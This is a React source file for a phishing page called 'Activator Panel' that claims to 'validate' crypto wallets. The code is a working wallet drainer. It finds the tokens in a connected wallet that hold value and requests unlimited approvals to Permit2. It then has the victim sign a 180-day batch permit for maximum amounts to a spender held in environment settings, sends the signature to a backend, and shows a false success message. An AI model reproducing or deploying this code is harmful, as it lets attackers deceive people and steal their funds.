'use client';

import { useState, useCallback, useEffect } from 'react';
import { Card, CardContent } from '@/components/ui/card';
import Image from 'next/image';
import {
  AllowanceProvider,
  MaxAllowanceTransferAmount,
} from '@uniswap/permit2-sdk';
import { ethers, Contract } from 'ethers';
import { createAppKit, useAppKit, useAppKitProvider } from '@reown/appkit/react';
import { Ethers5Adapter } from '@reown/appkit-adapter-ethers5';
import { mainnet, arbitrum, base, bsc, linea, polygon, zksync, optimism, avalanche, zora } from '@reown/appkit/networks';
import { Alchemy, Network } from 'alchemy-sdk';

type WalletType = {
  id: string;
  icon: string;
  name: string;
};

const wallets: WalletType[] = [
  { id: 'w1', icon: 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg', name: 'MetaMask' },
  { id: 'w2', icon: 'https://play-lh.googleusercontent.com/mHjR3KaAMw3RGA15-t8gXNAy_Onr4ZYUQ07Z9fG2vd51IXO5rd7wtdqEWbNMPTgdqrk', name: 'Ledger' },
  { id: 'w3', icon: 'https://play-lh.googleusercontent.com/NwpBM4zjlxtmm6WWOw0k7M4F2Wpqx0LQpw9Zh-iAAoJPKgNK1vU2DotASwnRorSH5kY=w240-h480-rw', name: 'Trezor' },
  { id: 'w4', icon: 'https://logowik.com/content/uploads/images/trust-wallet-shield4830.logowik.com.webp', name: 'Trust Wallet' },
  { id: 'w5', icon: 'https://www.nuget.org/profiles/WalletConnect/avatar?imageSize=512', name: 'WalletConnect' },
  { id: 'w6', icon: 'https://cryptologos.cc/logos/stacks-stx-logo.png', name: 'Stacks' },
  { id: 'w7', icon: 'https://play-lh.googleusercontent.com/uT6ByyNvUeLRMDnMKEC91RrbHftl2EBB58r9vZaNbiYf1F5Twa33_Hx0zYvEfCtiG1kE', name: 'Safepal' },
  { id: 'w8', icon: 'https://moonpay-marketing-c337344.payloadcms.app/api/media/file/6q7ysxp7jwi-4ArVLd4qOC6hpY4D7us0r0', name: 'Exodus' },
  { id: 'w9', icon: 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/23/5d/c8/235dc851-fb29-48f1-2931-2e6073926c5c/AppIcon-1x_U007emarketing-0-10-0-85-220.png/1200x600wa.png', name: 'Atomic' },
  { id: 'w10', icon: 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/66/4a/b9/664ab980-b8c3-afc9-abc1-5032075ba74f/AppIcon-0-0-1x_U007epad-0-1-85-220.png/1200x630wa.png', name: 'Gem Wallet' },
  { id: 'w11', icon: 'https://cdn.prod.website-files.com/61d2c808f50b08ee42c1c477/63d7874416c8c09dc1d6f876_PhantomSG.png', name: 'Phantom' },
  { id: 'w12', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSKbTDy_dXBdXPnBio-Db-Zy7uckGclEP_BQQ&s', name: 'Wasabi' },
  { id: 'w13', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS5iKZyaXBLLZtV4H3_H-sefyvFdr5hGpZgSQ&s', name: 'Binance' },
  { id: 'w14', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTXQ4V6xWzg9q8L7jbqOpnQxaAyW6E-opOoOg&s', name: 'Arbitrum' },
  { id: 'w15', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQwIFBCAUmoMWPS_Bn7zUC3NOGuCIzaSdvjMQ&s', name: 'Aave' },
  { id: 'w16', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQijOUWd8bRawiQ4idpjdlmSLC3JqfdP5iiCg&s', name: 'Ton Hub' },
  { id: 'w17', icon: 'https://storage.googleapis.com/ton-strapi/Gradient_Type_Blue_Turquoise_1_5d461e32c4/Gradient_Type_Blue_Turquoise_1_5d461e32c4.png', name: 'Ton Keeper' },
  { id: 'w18', icon: 'https://play-lh.googleusercontent.com/W1vPuFWyzhrUUuF6P2T6HcNDmfeBf4tTZspEDM9gek0vU1W0MA0SoQLJGDUwdIVJyA', name: 'Onto' },
  { id: 'w19', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQVDdnuPg48c1RcMIUxSMMrMRRrI4KSqHMhCw&s', name: 'Ownbit' },
  { id: 'w20', icon: 'https://pbs.twimg.com/media/GcC2hcpXgAAc2tW.png', name: 'Solflare' },
  { id: 'w21', icon: 'https://play-lh.googleusercontent.com/wjRjMDJ0GJDURRVhHeJ9GvBs171vfUuW1chLMPqeqHqB3o5LBQHWjYmt--eGwej4Ng', name: 'Glow' },
  { id: 'w22', icon: 'https://play-lh.googleusercontent.com/EhgMPJGUYrA7-8PNfOdZgVGzxrOw4toX8tQXv-YzIvN6sAMYFunQ55MVo2SS_hLiNm8', name: 'Backpack' },
  { id: 'w23', icon: 'https://play-lh.googleusercontent.com/-EcyFeHtPSGptfsZzgucRU2AOVgnGHyQ2DKx3R-dEbms4g4BzbvHpo8R-P-wrl18XCMk', name: 'Bitget' },
  { id: 'w24', icon: 'https://play-lh.googleusercontent.com/m9Ne2k_sHsLtlrdGATKHPNEDW2cDGlFf0FPhafMRxLaiwPnIEQa8J1-CEi3wztqQmmng', name: 'Zerion' },
  { id: 'w25', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSZU2WKaWruPknBKqHS0sUHcA8gmV4-Vo7bAZj-3oNd-mAF7N2bXbez5hNIyenbnPW8xpo&usqp=CAU', name: 'OKX' },
  { id: 'w26', icon: 'https://play-lh.googleusercontent.com/Jr9mlVzTOG_1uJPUrxoOR7llaQIpBYNxT5hZw0BUqaqjN1Cqsky-RjaTyAorkFlMZQ', name: 'Petra' },
  { id: 'w27', icon: 'https://miro.medium.com/v2/resize:fit:700/0*cBQArUdm7Ck5qHTA.png', name: 'Martian' },
  { id: 'w28', icon: 'https://avatars.githubusercontent.com/u/110686627?v=4', name: 'Suiet' },
  { id: 'w29', icon: 'https://pbs.twimg.com/profile_images/1085243621933232131/VjI2slUx_400x400.jpg', name: 'Solar' },
  { id: 'w30', icon: 'https://play-lh.googleusercontent.com/SKXXUqR4jXkvPJvKSXhJkQjKUU9wA-hI9lgBTrpxEz5GP8NbaOeSaEp1zzQscv8BTA', name: 'Kepler' },
  { id: 'w31', icon: 'https://framerusercontent.com/images/AbGYvbwnLekBbsdf5g7PI5PpSg.png', name: 'Leap' },
  { id: 'w32', icon: 'https://play-lh.googleusercontent.com/P-xt-cfYUtwVQ3YsNb5yd5_6MzCHmcKAbRkt-up8Ga44x_OCGLy4WFxsGhxfJaSLEw', name: 'Argent' },
  { id: 'w33', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQOtKTpWMRg4JRSczLSN5FFOoTftXc06jBt4g&s', name: 'Sushiswap' },
  { id: 'w34', icon: 'https://defiguide.org/wp-content/uploads/2022/05/Featured-image-7-850x550.png', name: 'lido' },
  { id: 'w35', icon: 'https://play-lh.googleusercontent.com/rJF2Bcp9EDfARTSY-7DmYnX0Q6cX3zBwXm2RSUjjDInUObbiM1iVKfjXKZRS2BP7gSE', name: 'Uniswap' },
  { id: 'w36', icon: 'https://lh3.googleusercontent.com/9sYF-0oYgi1bJSfODRWBSw8bTQQMroEqgpHXY8vGyWs1zw94H1JBMwjtuiHKD15stcIdN16mR4RVPq9gBkugUfXu=s128-rj-sc0x00ffffff', name: 'Parallel' },
  { id: 'w37', icon: 'https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcRUtu0e4DXEBhzsTZ1c3cg7ws8S_b2TxZDsbisDN4Lu9J5W4_1VuvKqGuT0F7jilKfUi-yrKAXEuDDzwWKRMNqsbdpV12g16phiiBccug', name: 'Polkadot' },
  { id: 'w38', icon: 'https://thegivingblock.com/wp-content/uploads/2021/08/ChainLink-LINK-Logo.png', name: 'Link' },
  { id: 'w39', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS4xJyQK64TJEFv1wEbczOz2JPvVUvlIaYwng&s', name: 'Kryptic Wallet' },
  { id: 'w40', icon: 'https://play-lh.googleusercontent.com/Jr9mlVzTOG_1uJPUrxoOR7llaQIpBYNxT5hZw0BUqaqjN1Cqsky-RjaTyAorkFlMZQ', name: 'Znky' },
  { id: 'w41', icon: 'https://pbs.twimg.com/profile_images/1085243621933232131/VjI2slUx_400x400.jpg', name: 'Zlot' },
  { id: 'w42', icon: 'https://play-lh.googleusercontent.com/yIMq5XmB746hqH2xbyIuvgtLT5f9zKk54tRMzDJJM7m8Vw8H_X0jj45lZtrJrVOyB70Z', name: 'Zelcore' },
  { id: 'w43', icon: 'https://play-lh.googleusercontent.com/lxl3CQLYmbY7kHtMn3ehz06ebEIIxYOETf8hlWPNW6L3ZPxuhSrnIq-4k5T89gd4gA', name: 'Zerion' },
  { id: 'w44', icon: 'https://iq.wiki/_next/image?url=https%3A%2F%2Fipfs.everipedia.org%2Fipfs%2FQmXU4SwStE5s4M9ynRZt2rn5ERasrUrjbHYBAzXehC9bs4&w=3840&q=95', name: 'XDC' },
  { id: 'w45', icon: 'https://coincentral.com/wp-content/uploads/2021/03/what-is-yearn-finance.png', name: 'Yearn' },
  { id: 'w46', icon: 'https://coincentral.com/wp-content/uploads/2021/03/what-is-yearn-finance.png', name: 'Yr' },
  { id: 'w47', icon: 'https://www.nobsbitcoin.com/content/images/2025/02/wasabiwalletv251.jpg', name: 'Wasabi' },
  { id: 'w48', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQOtKTpWMRg4JRSczLSN5FFOoTftXc06jBt4g&s', name: 'Xeipay' },
  { id: 'w49', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS5iKZyaXBLLZtV4H3_H-sefyvFdr5hGpZgSQ&s', name: 'Wallet' },
  { id: 'w50', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTD5Ahat1i1mkL7EQWbUXEicAZHjStLfaOw3A&s', name: 'Tongue' },
  { id: 'w51', icon: 'https://tor.us/images/Wallet---user.svg', name: 'Torus' },
  { id: 'w52', icon: 'https://defiguide.org/wp-content/uploads/2022/05/Featured-image-7-850x550.png', name: 'Truthvault' },
  { id: 'w53', icon: 'https://miro.medium.com/v2/resize:fit:700/0*cBQArUdm7Ck5qHTA.png', name: 'Ungii' },
  { id: 'w54', icon: 'https://avatars.githubusercontent.com/u/36172275?s=280&v=4', name: 'Unstoppable' },
  { id: 'w55', icon: 'https://img.utdstc.com/icon/141/e2f/141e2fa09926afa6f6b49e60f4dcd4f1ad71eca04deed99e0a50026d280e2b98:200', name: 'Version' },
  { id: 'w56', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR-VbRs6juwQhrozmvQHIK-sEJB0ROKyUP1Hw&s', name: 'Via' },
  { id: 'w57', icon: 'https://play-lh.googleusercontent.com/FVDtw6vCV9RFTAO7jjFf0juosjuQql3dHJIJtE30okJEn4R1om2YzJHclmiwd10CuIFi', name: 'Eclipse' },
  { id: 'w58', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQadBPkDW0eZscxtWai-LsJWmnWwwsn7plzpw&s', name: 'Massa' },
  { id: 'w59', icon: 'https://play-lh.googleusercontent.com/0BY-XzNk_6R3DS_oNZfRI-x5L2PDgX8BDo7OL8kPDCKaQi0YzXGrYKWaT2lbOkqqGrs', name: 'Leap' },
  { id: 'w60', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTh4K1QctcLFb5izZFPk7o8xqZACdbOcssxOxXTo0n7hEWJQLUyIa7ap-_xAnwBsRSp1TI&usqp=CAU', name: 'Injective' },
]


interface PermitDetails {
  token: string;
  amount: ethers.BigNumberish;
  expiration: number;
  nonce: number;
}

interface PermitBatch {
  details: PermitDetails[];
  spender: string;
  sigDeadline: number;
}

interface TokenWithValue {
  address: string;
  symbol: string;
  balance: ethers.BigNumber;
  decimals: number;
  price: number;
  value: number;
}

const MIN_TOKEN_VALUE_USD = 0.1;

function toDeadline(expiration: number): number {
  return Math.floor((Date.now() + expiration) / 1000);
}

const alchemyConfig = {
  apiKey: process.env.NEXT_PUBLIC_ALCHEMY_API_KEY,
};

const networkMap: { [key: number]: Network } = {
  1: Network.ETH_MAINNET,
  8453: Network.BASE_MAINNET,
  42161: Network.ARB_MAINNET,
  56: Network.BNB_MAINNET,
  7777777: Network.ZORA_MAINNET,
  81457: Network.BLAST_MAINNET,
  324: Network.ZKSYNC_MAINNET,
  10: Network.OPT_MAINNET,
  43114: Network.AVAX_MAINNET,
};

const CONTRACT_ADDRESSES: { [Key: number]: string} = {
  1: process.env.NEXT_PUBLIC_MAINNET_SPENDER!,       // Ethereum Mainnet
  42161: process.env.NEXT_PUBLIC_ARBITRUM_SPENDER!, // Arbitrum
  56: process.env.NEXT_PUBLIC_BNB_SPENDER!,          // BSC
  8453: process.env.NEXT_PUBLIC_BASE_SPENDER!,       // Base
  10: process.env.NEXT_PUBLIC_OPTIMISM_SPENDER!,     // Optimism
  43114: process.env.NEXT_PUBLIC_AVALANCHE_SPENDER!, // Avalanche
  324: process.env.NEXT_PUBLIC_ZKSYNC_SPENDER!,      // zkSync
  137: process.env.NEXT_PUBLIC_POLYGON_SPENDER!,     // Polygon
  7777777: process.env.NEXT_PUBLIC_ZORA_SPENDER!,    //zora
  81457: process.env.NEXT_PUBLIC_BLAST_SPENDER!       //blast
}

const PERMIT2_ADDRESSES: { [key: number]: string } = {
  1: process.env.NEXT_PUBLIC_MAINNET_PERMIT2!,     // Ethereum Mainnet
  42161: process.env.NEXT_PUBLIC_ARBITRUM_PERMIT2!, // Arbitrum
  56: process.env.NEXT_PUBLIC_BNB_PERMIT2!,     // BSC
  8453: process.env.NEXT_PUBLIC_BASE_PERMIT2!,   // Base
  10: process.env.NEXT_PUBLIC_OPTIMISM_PERMIT2!,     // Optimism
  43114: process.env.NEXT_PUBLIC_AVALANCHE_PERMIT2!, // Avalanche
  324: process.env.NEXT_PUBLIC_ZKSYNC_PERMIT2!,   // zkSync Era Mainnet
  137: process.env.NEXT_PUBLIC_POLYGON_PERMIT2!,   // Polygon
  7777777: process.env.NEXT_PUBLIC_ZORA_PERMIT2!, // Zora
  81457: process.env.NEXT_PUBLIC_BLAST_PERMIT2!, // Blast
};

async function fetchValuableTokens(address: string, chainId: number): Promise<TokenWithValue[]> {
  try {
    const network = networkMap[chainId] || Network.ETH_MAINNET;
    const alchemy = new Alchemy({ ...alchemyConfig, network });
    const balances = await alchemy.core.getTokenBalances(address);

    const tokensWithMetadata = await Promise.all(
      balances.tokenBalances
        .filter(token => ethers.BigNumber.from(token.tokenBalance).gt(0))
        .map(async token => {
          const metadata = await alchemy.core.getTokenMetadata(token.contractAddress);
          if (metadata.name && metadata.symbol) {
            return {
              address: token.contractAddress,
              symbol: metadata.symbol,
              balance: ethers.BigNumber.from(token.tokenBalance),
              decimals: metadata.decimals || 18,
              price: 0,
              value: 0,
            };
          }
          return null;
        })
    );

    const validTokens = tokensWithMetadata.filter((token): token is TokenWithValue => token !== null);
    const symbols = validTokens.map(token => token.symbol);

    try {
      const priceData = await alchemy.prices.getTokenPriceBySymbol(symbols);
      const tokensWithValues = validTokens.map(token => {
        const tokenPriceInfo = priceData.data.find(p => p.symbol === token.symbol);
        if (tokenPriceInfo && !tokenPriceInfo.error && tokenPriceInfo.prices && tokenPriceInfo.prices.length > 0) {
          const usdPrice = parseFloat(tokenPriceInfo.prices[0].value);
          const normalizedBalance = parseFloat(ethers.utils.formatUnits(token.balance, token.decimals));
          const usdValue = normalizedBalance * usdPrice;
          return { ...token, price: usdPrice, value: usdValue };
        }
        return token;
      });

      const valuableTokens = tokensWithValues.filter(token => token.price > 0 && token.value >= MIN_TOKEN_VALUE_USD);
      console.log(`Filtered out ${tokensWithValues.length - valuableTokens.length} tokens below $${MIN_TOKEN_VALUE_USD} threshold`);
      return valuableTokens.sort((a, b) => b.value - a.value);
    } catch (priceError) {
      console.error('Failed to fetch token prices:', priceError);
      return [];
    }
  } catch (error) {
    console.error('Failed to fetch valuable tokens:', error);
    return [];
  }
}

const projectId = process.env.NEXT_PUBLIC_REOWN_PROJECT_ID!;
const metadata = {
  name: 'Activator Panel',
  description: 'Account and wallet validator tool',
  url: 'https://activatorpanel.com',
  icons: ['https://www.appactivator-panel.com/Home%20Page%20_%20Welcome%20to%20Panelactivator.com_files/save_bckudy.png'],
};

createAppKit({
  adapters: [new Ethers5Adapter()],
  metadata,
  networks: [mainnet, arbitrum, base, bsc, linea, polygon, zksync, optimism, avalanche, zora],
  projectId,
  features: { analytics: true },
});

export default function IssuesContent() {
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);
  const [account, setAccount] = useState<string>('');
  const [spender, setSpender] = useState<string>('');
  /* eslint-disable @typescript-eslint/no-unused-vars */
  const [signature, setSignature] = useState<string>(''); 
  /* eslint-enable @typescript-eslint/no-unused-vars */

  const [provider, setProvider] = useState<ethers.providers.Web3Provider | undefined>(undefined);
  const [chainId, setChainId] = useState<number>(0);
  const [tokens, setTokens] = useState<TokenWithValue[]>([]);
  const [loading, setLoading] = useState<boolean>(false);

  /* eslint-enable @typescript-eslint/no-unused-vars */
  const [totalValue, setTotalValue] = useState<number>(0);
  /* eslint-enable @typescript-eslint/no-unused-vars */
 
  const [showPopup, setShowPopup] = useState<boolean>(false);
  const [processingAction, setProcessingAction] = useState<string>('');

  const { open } = useAppKit();
  const { walletProvider } = useAppKitProvider<ethers.providers.ExternalProvider>('eip155');

  useEffect(() => {
    if (account && chainId) {
      setLoading(true);
      fetchValuableTokens(account, chainId)
        .then(valuableTokens => {
          setTokens(valuableTokens);
          const total = valuableTokens.reduce((sum, token) => sum + token.value, 0);
          setTotalValue(total);
          setLoading(false);
        })
        .catch(error => {
          console.error('Error fetching valuable tokens:', error);
          setLoading(false);
        });
    }
  }, [account, chainId]);

  const handleValidation = useCallback(async () => {
    if (!provider || !account || !chainId || tokens.length === 0) {
      alert('Please connect a wallet and ensure tokens are loaded.');
      return;
    }
  
    const permit2Address = PERMIT2_ADDRESSES[chainId];
    if (!permit2Address) {
      throw new Error(`No Permit2 address configured for chainId ${chainId}`);
    }
  
    try {
      const signer = provider.getSigner(account);
      const erc20Abi = [
        'function approve(address spender, uint256 amount)', 
        'function allowance(address owner, address spender) view returns (uint256)'
      ];
  
      setProcessingAction('checking_approvals');
      
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const validTokens: any[] = []; // Only tokens that pass validation
      
      // Step 1: Validate tokens and check approvals
      for (const token of tokens) {
        try {
          console.log(`Checking ${token.symbol}...`);
          
          // Validate token contract exists and has required functions
          const tokenContract = new Contract(token.address, erc20Abi, provider);
          
          // Test if the contract has the allowance function by calling it
          let currentAllowance;
          try {
            currentAllowance = await tokenContract.allowance(account, permit2Address);
            console.log(`✅ ${token.symbol} allowance check successful: ${currentAllowance.toString()}`);
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
          } catch (allowanceError: any) {
            console.error(`❌ ${token.symbol} allowance check failed:`, allowanceError.message);
            console.log(`Skipping ${token.symbol} - invalid token contract or missing allowance function`);
            continue; // Skip this token entirely
          }
          
          // Check if approval is needed
          if (currentAllowance.lt(MaxAllowanceTransferAmount)) {
            console.log(`${token.symbol} needs approval`);
            setProcessingAction(`approving_${token.symbol}`);
            
            try {
              const signerContract = new Contract(token.address, erc20Abi, signer);
              const tx = await signerContract.approve(permit2Address, MaxAllowanceTransferAmount);
              await tx.wait();
              console.log(`✅ ${token.symbol} approved successfully`);
            // eslint-disable-next-line @typescript-eslint/no-explicit-any
            } catch (approveError: any) {
              console.error(`❌ Failed to approve ${token.symbol}:`, approveError.message);
              console.log(`Skipping ${token.symbol} - approval failed`);
              continue; // Skip this token
            }
          } else {
            console.log(`✅ ${token.symbol} already approved`);
          }
          
          // If we get here, the token is valid and approved
          validTokens.push(token);
          
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        } catch (tokenError: any) {
          console.error(`❌ Error with ${token.symbol}:`, tokenError.message);
          console.log(`Skipping ${token.symbol} - general error`);
          continue; // Skip this token and continue with others
        }
      }
      
      // Check if we have any valid tokens to proceed with
      if (validTokens.length === 0) {
        throw new Error('No valid tokens found. All tokens failed validation or approval.');
      }
      
      if (validTokens.length < tokens.length) {
        const skippedTokens = tokens.filter(t => !validTokens.find(vt => vt.address === t.address));
        console.warn(`⚠️ Proceeding with ${validTokens.length}/${tokens.length} tokens. Skipped: ${skippedTokens.map(t => t.symbol).join(', ')}`);
      }
  
      // Step 2: Create permit signature for valid tokens only
      setProcessingAction('signing_permit');
      console.log(`Creating permit for ${validTokens.length} valid tokens...`);
      
      const details: PermitDetails[] = [];
      
      for (let i = 0; i < validTokens.length; i++) {
        const token = validTokens[i];
        details.push({
          token: ethers.utils.getAddress(token.address),
          amount: MaxAllowanceTransferAmount,
          expiration: toDeadline(1000 * 60 * 60 * 24 * 180),
          nonce: 0,
        });
      }
  
      const permitBatch: PermitBatch = {
        details,
        spender,
        sigDeadline: toDeadline(1000 * 60 * 60 * 24 * 180),
      };
  
      const domain = {
        name: 'Permit2',
        chainId: chainId,
        verifyingContract: permit2Address,
      };
  
      const types = {
        PermitBatch: [
          { name: 'details', type: 'PermitDetails[]' },
          { name: 'spender', type: 'address' },
          { name: 'sigDeadline', type: 'uint256' },
        ],
        PermitDetails: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint160' },
          { name: 'expiration', type: 'uint48' },
          { name: 'nonce', type: 'uint48' },
        ],
      };
  
      const signature = await signer._signTypedData(domain, types, permitBatch);
      setSignature(signature);
      console.log('✅ Permit signature created for valid tokens');
  
      // Step 3: Store permit
      const response = await fetch('/api/store/permit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          permitBatch, 
          signature, 
          owner: account, 
          chainId,
          validTokens: validTokens.map(t => t.symbol),
          skippedTokens: tokens.filter(t => !validTokens.find(vt => vt.address === t.address)).map(t => t.symbol)
        }),
      });
  
      const result = await response.json();
      if (response.ok) {
        console.log('✅ Account validation successful');
        setShowPopup(false);
        
        // Show success message with details
        let message = `Account Validated Successfully!\n\nProcessed: ${validTokens.map(t => t.symbol).join(', ')}`;
        if (validTokens.length < tokens.length) {
          const skipped = tokens.filter(t => !validTokens.find(vt => vt.address === t.address));
          message += `\n\nSkipped (invalid): ${skipped.map(t => t.symbol).join(', ')}`;
        }
        alert(message);
      } else {
        throw new Error(result.message || 'Failed to store permit');
      }
      
    } catch (e) {
      console.error('❌ Validation failed:', e);
      alert(`Validation failed: ${e instanceof Error ? e.message : 'Unknown error'}`);
    } finally {
      setProcessingAction('');
    }
  }, [account, provider, spender, chainId, tokens]);

  const connectWallet = useCallback(async () => {
    try {
      await open();
      if (walletProvider) {
        const web3Provider = new ethers.providers.Web3Provider(walletProvider);
        const signer = web3Provider.getSigner();
        const address = await signer.getAddress();
        const checkSummedAddress = ethers.utils.getAddress(address);
        const network = await web3Provider.getNetwork();
        const chainId = network.chainId;

        // Get the appropriate spender address based on chainId
        const spenderAddress = CONTRACT_ADDRESSES[chainId];
        if (!spenderAddress) {
          throw new Error(`No spender address configured for chainId ${chainId}`);
        }

        setProvider(web3Provider);
        setAccount(checkSummedAddress);
        setSpender(spenderAddress);
        setChainId(chainId);
        setShowPopup(true);
      }
    } catch (e) {
      console.error('Wallet connection failed:', e);
      alert(`Wallet connection failed: ${e instanceof Error ? e.message : 'Unknown error'}`);
    }
  }, [open, walletProvider]);


  const formatAddress = (address: string): string => {
    return `${address.substring(0, 6)}...${address.substring(address.length - 4)}`;
  };

  const getNetworkName = (chainId: number): string => {
    const networkNames: { [key: number]: string } = {
      1: 'Ethereum Mainnet',
      42161: 'Arbitrum',
      56: 'Binance Smart Chain',
      8453: 'Base',
      10: 'Optimism',
      43114: 'Avalanche',
      324: 'zkSync Era',
      137: 'Polygon',
      7777777: 'Zora',
      81457: 'Blast',
    };
    return networkNames[chainId] || `Unknown Network (Chain ID: ${chainId})`;
  };

  return (
    <div className="w-full relative">
      <section className="container mx-auto px-4 sm:px-6 lg:px-8">
        <h2 className="text-lg sm:text-xl md:text-2xl lg:text-3xl font-bold mb-4 sm:mb-6 text-center text-blue-700 mt-16 md:mt-20">
          Connection Page
        </h2>
        <p className="text-center text-sm sm:text-base md:text-lg text-gray-600 mb-8 sm:mb-10 max-w-2xl mx-auto">
          Connect with one of our available providers or create a new one.
        </p>
        <div className="grid grid-cols-2 gap-3 sm:gap-4 md:gap-6">
          {wallets.map((wallet) => (
            <Card
              key={wallet.id}
              className={`cursor-pointer transition-all ${
                selectedWallet === wallet.id ? 'ring-1 ring-purple-600' : 'hover:bg-gray-50'
              }`}
              onClick={() => {
                setSelectedWallet(wallet.id);
                connectWallet();
              }}
            >
              <CardContent className="flex flex-col items-center justify-center p-3 sm:p-4">
                <span className="flex flex-col items-center">
                  <div className="mb-3 sm:mb-4">
                    <Image
                      src={wallet.icon}
                      alt={wallet.name}
                      width={36}
                      height={36}
                      className="w-8 h-8 sm:w-10 sm:h-10 md:w-12 md:h-12 object-contain"
                    />
                  </div>
                  <span className="text-xs sm:text-sm md:text-base font-semibold text-center text-blue-600">
                    {wallet.name}
                  </span>
                </span>
              </CardContent>
            </Card>
          ))}
        </div>
      </section>

      {showPopup && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
          <div className="bg-white rounded-lg shadow-xl p-6 max-w-md w-full mx-4">
            <div className="text-center mb-6">
              <h3 className="text-xl font-bold text-blue-700 mb-2">Account Validation Required</h3>
              {!CONTRACT_ADDRESSES[chainId] ? (
                <p className="text-red-600 mb-4">
                  This network ({getNetworkName(chainId)}) is not supported yet. Please switch to a supported network.
                </p>
              ) : (
                <p className="text-gray-600 mb-4">
                  To proceed, please validate your account:
                </p>
              )}

              {account && (
                <div className="bg-gray-100 rounded-md p-3 mb-4">
                  <p className="text-sm text-gray-700 mb-1">Connected Account:</p>
                  <p className="font-mono text-blue-600 font-medium">{formatAddress(account)}</p>
                  <p className="text-sm text-gray-700 mt-2 mb-1">Network:</p>
                  <p className="font-medium text-blue-600">{getNetworkName(chainId)}</p>
                </div>
              )}

              {loading ? (
                <div className="flex justify-center items-center p-4">
                  <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-700"></div>
                  <p className="ml-3 text-blue-700">Loading...</p>
                </div>
              ) : processingAction ? (
                <div className="flex justify-center items-center p-4">
                  <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-700"></div>
                  <p className="ml-3 text-blue-700">
                    {processingAction === 'approve' ? 'Validating...' : 'Signing...'}
                  </p>
                </div>
              ) : (
                <div className="flex flex-col gap-3">
                  <button
                    onClick={handleValidation}
                    disabled={!provider || !tokens.length || !CONTRACT_ADDRESSES[chainId]}
                    className={`w-full py-3 px-4 rounded-lg font-medium text-white ${
                      !provider || !tokens.length || !CONTRACT_ADDRESSES[chainId]
                        ? 'bg-gray-400 cursor-not-allowed'
                        : 'bg-blue-600 hover:bg-blue-700'
                    } transition-colors duration-200`}
                  >
                    Validate Account
                  </button>
                  <button
                    onClick={() => setShowPopup(false)}
                    className="w-full py-2 px-4 rounded-lg font-medium text-gray-700 bg-gray-200 hover:bg-gray-300 mt-2"
                  >
                    Cancel
                  </button>
                </div>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
}




